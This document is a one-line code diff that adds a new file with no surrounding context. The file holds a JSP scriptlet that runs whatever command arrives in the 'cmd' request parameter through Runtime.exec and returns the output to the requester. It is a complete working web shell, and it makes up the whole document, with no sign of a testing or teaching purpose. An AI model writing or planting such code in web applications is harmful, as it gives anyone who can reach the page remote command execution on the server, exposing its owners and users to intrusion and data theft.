@@ -1,0 +1,1 @@
+<%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()%>
